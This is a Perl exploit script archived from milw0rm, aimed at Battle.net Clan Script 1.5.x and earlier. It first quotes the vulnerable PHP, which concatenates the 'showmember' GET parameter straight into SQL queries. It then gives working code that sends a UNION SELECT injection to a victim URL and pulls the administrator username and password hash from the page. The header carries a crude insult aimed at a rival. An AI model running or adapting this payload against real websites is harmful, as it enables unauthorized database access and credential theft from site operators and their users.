<html><head><title>Battle.net Clan Script <= 1.5.x Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
# download script : http://sourceforge.net/project/showfiles.php?group_id=142506&amp;package_id=156487
##############################################################
# Battle.net Clan Script &lt;= 1.5.x - Remote SQL Inj Exploit   #
##############################################################
########################################
#[*] Founded by : Stack-Terrorist [v40]
#[*] Contact: Ev!L
#[*] Greetz : Houssamix &amp; All muslims HaCkeRs  :)
#[*] Fuck   : JosS :@
########################################
# vulnerable page
########################################
#&lt;div id=&quot;header&quot;&gt;&lt;h1&gt;&lt;?php echo $site_name ?&gt;&lt;/h1&gt;&lt;/div&gt;
#&lt;div id=&quot;gutter&quot;&gt;&lt;/div&gt;
#&lt;div id=&quot;col1&quot;&gt;
# &lt;?php showNav(); ?&gt;#div&gt;
#&lt;div id=&quot;col2&quot;&gt;
# &lt;?php
# if(!isset($_GET['showmember']))
# { ?&gt;
#  &lt;h2&gt;Members&lt;/h2&gt;
#  &lt;table id=&quot;members&quot;&gt;
#   &lt;tr&gt;
#    &lt;th&gt;Rank&lt;/th&gt;
#    &lt;th&gt;Member Name&lt;/th&gt;
#    &lt;th&gt;Email&lt;/th&gt;
#    &lt;th&gt;Date Joined&lt;/th&gt;
#   &lt;/tr&gt;
#   &lt;?php#mysql_select_db($mysql_db) or die(mysql_error());
#   $sql = 'SELECT bcs_members.id, bcs_members.name, bcs_members.email, bcs_members.date, bcs_ranks.`order`, bcs_ranks.name AS rank '
#    . 'FROM bcs_members, bcs_ranks WHERE bcs_members.rank = bcs_ranks.id ORDER BY `order`, id';
#   $alt = 0;
#   $result = mysql_query($sql)  or die(mysql_error());
#   while($r=mysql_fetch_array($result))
#   {
#    $id=$r[&quot;id&quot;];
#    $name=$r[&quot;name&quot;];
#    $rank=$r[&quot;rank&quot;];
##    $email=$r[&quot;email&quot;];
 #   $recruit=$r[&quot;recruit&quot;];
 #   $date=$r[&quot;date&quot;];
 #   if($recruit === '') { $recruit = '&amp;nbsp;'; }
 #   if ($alt % 2 == 0) { echo '&lt;tr class=&quot;altrow&quot;&gt;' . &quot;\n&quot;; }
 ##   else {  echo '&lt;tr&gt;' . &quot;\n&quot;; }
  #  echo '&lt;td&gt;' . $rank . '&lt;/td&gt;' . &quot;\n&quot;;
  #  echo '&lt;td&gt;&lt;a href=&quot;?page=members&amp;showmember=' . $name . '&quot;&gt;' . $name . '&lt;/a&gt;&lt;/td&gt;' . &quot;\n&quot;;
  ##  if($email === '') { echo '&lt;td&gt;n/a&lt;/td&gt;' . &quot;\n&quot;; }
   # else { echo '&lt;td&gt;&lt;a href=&quot;mailto:' . $email . '&quot;&gt;Email&lt;/a&gt;&lt;/td&gt;' . &quot;\n&quot;; }
   # echo '&lt;td&gt;' . date(&quot;F d, Y&quot;, strtotime($date)) . '&lt;/td&gt;' . &quot;\n&quot;;
   # echo '&lt;/tr&gt;' . &quot;\n&quot;;
   # $alt = $alt + 1;
   #}
   #?&gt;
  #&lt;/table&gt;
# &lt;?php
 #} // end of if $_GET
 #else
 #{?&gt;
 # &lt;h2&gt;Member Details&lt;/h2&gt;
 # &lt;table id=&quot;members&quot;&gt;
 #  &lt;tr&gt;
 #   &lt;th&gt;Rank&lt;/th&gt;
 #   &lt;th&gt;Member Name&lt;/th&gt;
 #   &lt;th&gt;Email&lt;/th&gt;
  #  &lt;th&gt;Date Joined&lt;/th&gt;
  # &lt;/tr&gt;
  # &lt;tr&gt;
  # &lt;?php
  # mysql_connect($mysql_host, $mysql_user, $mysql_pass) or die(mysql_error());
  # mysql_select_db($mysql_db) or die(mysql_error());
  # $sql = &quot;SELECT `bcs_members`.`name`, `bcs_members`.`email`, `bcs_members`.`date`, `bcs_ranks`.`name` AS 'rank'&quot;
  #  . &quot;FROM `bcs_members`, `bcs_ranks` WHERE `bcs_members`.`rank` = `bcs_ranks`.`id` AND `bcs_members`.`name` = '&quot; . $_GET['showmember'] . &quot;'&quot;;
  # $result = mysql_query($sql)  or die(mysql_error());
  # $r=mysql_fetch_array($result);
  # echo '&lt;td&gt;' . $r[&quot;rank&quot;] . '&lt;/td&gt;' . &quot;\n&quot;;
  # echo '&lt;td&gt;' . $r[&quot;name&quot;] . '&lt;/td&gt;' . &quot;\n&quot;;
  # if($r[&quot;email&quot;] === '') { echo '&lt;td&gt;n/a&lt;/td&gt;' . &quot;\n&quot;; }
  # else { echo '&lt;td&gt;&lt;a href=&quot;mailto:' . $r[&quot;email&quot;] . '&quot;&gt;Email&lt;/a&gt;&lt;/td&gt;' . &quot;\n&quot;; }
  # echo '&lt;td&gt;' . date(&quot;F d, Y&quot;, strtotime($r[&quot;date&quot;])) . '&lt;/td&gt;' . &quot;\n&quot;;
  # ?&gt;
  # &lt;/tr&gt;
  #&lt;/table&gt;
  #&lt;br/&gt;
  #&lt;h2&gt;Medals&lt;/h2&gt;
  #&lt;table id=&quot;members&quot;&gt;
  # &lt;tr&gt;
  #  &lt;th&gt;Medal&lt;/th&gt;
  #  &lt;th&gt;Medal Name&lt;/th&gt;
  #  &lt;th&gt;Description&lt;/th&gt;
  # &lt;/tr&gt;
  # &lt;tr&gt;
  # &lt;?php
  # $alt = 0;
  # $sql = 'SELECT `bcs_medals` . `path` , `bcs_medals` . `name` , `bcs_medals` . `description` '
  #  . ' FROM `bcs_medals` , `bcs_members` , `bcs_medal_list` '
   # . &quot; WHERE `bcs_members` . `name` = '&quot; . $_GET['showmember'] . &quot;'&quot;
   # . ' AND `bcs_medal_list` . `mem_id` = `bcs_members` . `id` '
  #  . ' AND `bcs_medal_list` . `medal` = `bcs_medals` . `id` ';
  # $result = mysql_query($sql)  or die(mysql_error());
  # while($r=mysql_fetch_array($result))
  # {
  #  $id=$r[&quot;id&quot;];
   # $name=$r[&quot;name&quot;];
   # $path=$r[&quot;path&quot;];
   # $desc=$r[&quot;description&quot;];
   # if ($alt % 2 == 0) { echo '&lt;tr class=&quot;altrow&quot;&gt;' . &quot;\n&quot;; }
   # else {  echo '&lt;tr&gt;' . &quot;\n&quot;; }
   # echo '&lt;td class=&quot;center&quot;&gt;&lt;img src=&quot;' . $path . '&quot; alt=&quot;' . $name . '&quot;/&gt;&lt;/td&gt;' . &quot;\n&quot;;
   # echo &quot;&lt;td&gt;&quot; . $name . &quot;&lt;/td&gt;\n&quot;;
   # echo &quot;&lt;td&gt;&quot; . $desc . &quot;&lt;/td&gt;\n&quot;;
   # echo &quot;&lt;/tr&gt;\n&quot;;
   # $alt = $alt + 1;
   #}?&gt;
#   &lt;/tr&gt;
#  &lt;/table&gt;
# &lt;?php
#  echo &quot;&lt;br/&gt;\n&quot;;
#  echo &quot;&lt;h2&gt;Recruited&lt;/h2&gt;\n&quot;;
#  $result = mysql_query(&quot;SELECT bcs_members.name FROM bcs_members, (SELECT id FROM bcs_members WHERE name = '&quot; . $_GET['showmember'] . &quot;') AS results &quot;
#   . &quot;WHERE results.id = bcs_members.recruit&quot;)  or die(mysql_error());
#  while($r=mysql_fetch_array($result))
#  {
#   echo $r[&quot;name&quot;] . &quot;&lt;br/&gt;\n&quot;;
#  }
# }
# ?&gt;
#&lt;/div&gt;
#&lt;div id=&quot;footer&quot;&gt;&lt;?php echo $release; ?&gt;&lt;/div&gt;*/
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
system(&quot;color a&quot;);
print &quot;\t\t############################################################\n\n&quot;;
print &quot;\t\t# Battle.net Clan Script &lt;= 1.5.x - Remote SQL Inj Exploit #\n\n&quot;;
print &quot;\t\t#                 by Stack-Terrorist [v40]                 #\n\n&quot;;
print &quot;\t\t############################################################\n\n&quot;;
use LWP::UserAgent;
die &quot;Example: perl $0 http://victim.com/\n&quot; unless @ARGV;
system(&quot;color f&quot;);
#the username of joomla
$user=&quot;name&quot;;
#the pasword of joomla
$pass=&quot;password&quot;;
#the tables of joomla
$tab=&quot;bcs_members&quot;;
$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $ARGV[0] . &quot;/?page=members&amp;showmember=-1'%20union%20select%20&quot;.$pass.&quot;,user(),44,&quot;.$user.&quot;+from+&quot;.$tab.&quot;+where+id=1/*&quot;;
$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
$answer = $res-&gt;content;
if ($answer =~ /&lt;td&gt;(.*?)&lt;\/td&gt;/){
        print &quot;\nBrought to you by v4-team.com...\n&quot;;
        print &quot;\n[+] Admin User : $1&quot;;
}
if ($answer =~/([0-9a-fA-F]{32})/){print &quot;\n[+] Admin Hash : $1\n\n&quot;;
print &quot;\t\t#   Exploit has ben aported user and password hash   #\n\n&quot;;}
else{print &quot;\n[-] Exploit Failed...\n&quot;;}
# exploit exploited by Stack-Terrorist 

# milw0rm.com [2008-05-12]</pre></html>